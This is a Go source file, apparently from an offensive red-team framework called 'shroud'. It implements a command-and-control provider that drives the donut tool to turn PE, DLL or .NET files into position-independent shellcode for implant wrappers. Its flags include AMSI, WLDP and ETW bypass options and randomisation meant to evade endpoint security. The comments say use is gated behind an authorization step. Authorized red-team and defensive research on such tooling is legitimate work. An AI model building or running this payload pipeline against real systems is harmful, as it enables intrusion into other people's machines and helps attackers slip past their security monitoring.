// Package donut implements a c2.Provider backed by the `donut` shellcode generator
// (TheWover/Odzhan, v1). donut converts a PE / DLL / .NET assembly / VBS / JS file
// into position-independent shellcode — the natural "I have a PE/DLL, I need
// shellcode" provider that pairs with shroud's wrapping. This mirrors the
// metasploit provider: a CLI shell-out with no server state, writing the result
// to a temp file via -o so stdout/banner noise can never contaminate the bytes.
//
// Reached only through `shroud generate --c2 donut`, which is gated behind
// `shroud authorize`. See SECURITY.md — authorized use only.
package donut

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"shroud/internal/c2"

	"github.com/spf13/cobra"
	"github.com/spf13/pflag"
)

const providerName = "donut"

// provider implements c2.Provider.
type provider struct{}

func (provider) Name() string { return providerName }

func (provider) Help() string {
	return "donut — PE/DLL/.NET/shellcode -> PIC shellcode via `donut` (--donut-file, --donut-arch, --donut-args, --donut-method, --donut-class, --donut-entropy, --donut-exit, --donut-bypass, --donut-extra)."
}

// AddFlags registers donut's flags on a flag set (scoped to `generate`).
//
// Numeric flags use 0 = "unset" (let donut pick its own default) where the
// underlying donut option has a default; arch and format are the exceptions — we
// always emit them (arch defaults to amd64=2, format to Binary=1) so the produced
// shellcode is predictably raw amd64 PIC for our x64 implant wrappers.
func (provider) AddFlags(fs *pflag.FlagSet) {
	fs.String("donut-file", "", "input PE/DLL/.NET/shellcode file for donut (-i), required")
	fs.Int("donut-arch", 2, "donut target arch (-a): 1=x86, 2=amd64, 3=x86+amd64")
	fs.Int("donut-format", 1, "donut output format (-f): 1=Binary (raw PIC), 2=Base64, 3=C, …")
	fs.String("donut-args", "", "donut parameters/command line (-p), quoted, e.g. \"calc notepad\"")
	fs.String("donut-method", "", "donut DLL function/method (-m)")
	fs.String("donut-class", "", "donut .NET class name (-c), namespace.class")
	fs.Int("donut-entropy", 0, "donut entropy (-e): 1=None, 2=random names, 3=random+crypto; 0=donut default")
	fs.Int("donut-exit", 0, "donut exit behaviour (-x): 1=thread, 2=process, 3=block; 0=donut default")
	fs.Int("donut-bypass", 0, "donut AMSI/WLDP/ETW bypass (-b): 1=None, 2=abort on fail, 3=continue; 0=donut default")
	fs.String("donut-bin", "", "override path to the donut binary (else looked up on PATH)")
	fs.String("donut-extra", "", "extra raw args appended to donut (whitespace-split)")
}

// Preflight validates that the donut binary is available and --donut-file is set.
func (provider) Preflight(cmd *cobra.Command) error {
	if fileFlag(cmd) == "" {
		return errors.New("--donut-file is required for --c2 donut (a PE/DLL/.NET/shellcode file to convert)")
	}
	if bin := binFlag(cmd); bin != "" {
		if _, err := os.Stat(bin); err != nil {
			return fmt.Errorf("donut binary not found at --donut-bin %q: %w", bin, err)
		}
		return nil
	}
	if _, err := exec.LookPath("donut"); err != nil {
		return fmt.Errorf("donut not found on PATH — install donut (or set --donut-bin) for --c2 donut")
	}
	return nil
}

func (p provider) Fetch(cmd *cobra.Command) (*c2.ShellcodeResult, error) {
	if err := p.Preflight(cmd); err != nil {
		return nil, err
	}
	args, label, err := buildArgs(cmd)
	if err != nil {
		return nil, err
	}

	// Write to a temp file via -o so stdout/banner noise can never contaminate the
	// shellcode bytes (mirrors the metasploit provider's -o pattern).
	tmp, err := os.MkdirTemp("", "shroud-donut-*")
	if err != nil {
		return nil, fmt.Errorf("mktemp: %w", err)
	}
	defer os.RemoveAll(tmp)
	outFile := filepath.Join(tmp, "loader.bin")
	args = append(args, "-o", outFile)

	bin, err := resolveBin(cmd)
	if err != nil {
		return nil, err
	}
	start := time.Now()
	c := exec.Command(bin, args...)
	c.Stdin = strings.NewReader("")
	out, err := c.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("donut failed: %w\n%s", err, out)
	}
	data, err := os.ReadFile(outFile)
	if err != nil {
		return nil, fmt.Errorf("donut produced no output (%s): %w", outFile, err)
	}
	if len(data) == 0 {
		return nil, fmt.Errorf("donut output is empty\n%s", out)
	}
	return &c2.ShellcodeResult{
		Bytes:     data,
		SavePath:  outFile,
		Name:      label,
		Source:    "donut:" + label,
		BuildTime: time.Since(start).Round(time.Millisecond),
	}, nil
}

// buildArgs constructs the donut argv from the provider flags. Returns the arg
// slice and a short label (the input basename) for the Source field.
func buildArgs(cmd *cobra.Command) ([]string, string, error) {
	file := fileFlag(cmd)
	if file == "" {
		return nil, "", errors.New("--donut-file is required for --c2 donut")
	}
	arch := intFlag(cmd, "donut-arch")
	if arch == 0 {
		arch = 2 // amd64 default
	}
	format := intFlag(cmd, "donut-format")
	if format == 0 {
		format = 1 // Binary
	}

	var args []string
	args = append(args, "-i", file, "-a", strconv.Itoa(arch), "-f", strconv.Itoa(format))

	if v := intFlag(cmd, "donut-entropy"); v != 0 {
		args = append(args, "-e", strconv.Itoa(v))
	}
	if v := intFlag(cmd, "donut-exit"); v != 0 {
		args = append(args, "-x", strconv.Itoa(v))
	}
	if v := intFlag(cmd, "donut-bypass"); v != 0 {
		args = append(args, "-b", strconv.Itoa(v))
	}
	if s := stringFlag(cmd, "donut-args"); s != "" {
		args = append(args, "-p", s)
	}
	if s := stringFlag(cmd, "donut-method"); s != "" {
		args = append(args, "-m", s)
	}
	if s := stringFlag(cmd, "donut-class"); s != "" {
		args = append(args, "-c", s)
	}
	if extra := stringFlag(cmd, "donut-extra"); extra != "" {
		for _, a := range strings.Fields(extra) {
			args = append(args, a)
		}
	}
	return args, filepath.Base(file), nil
}

// resolveBin returns the donut binary path (--donut-bin override or PATH lookup).
func resolveBin(cmd *cobra.Command) (string, error) {
	if bin := binFlag(cmd); bin != "" {
		return bin, nil
	}
	return exec.LookPath("donut")
}

func fileFlag(cmd *cobra.Command) string { return stringFlag(cmd, "donut-file") }
func binFlag(cmd *cobra.Command) string { return stringFlag(cmd, "donut-bin") }

func stringFlag(cmd *cobra.Command, name string) string {
	v, _ := cmd.Flags().GetString(name)
	return v
}

func intFlag(cmd *cobra.Command, name string) int {
	v, _ := cmd.Flags().GetInt(name)
	return v
}

func init() {
	c2.Register(provider{})
}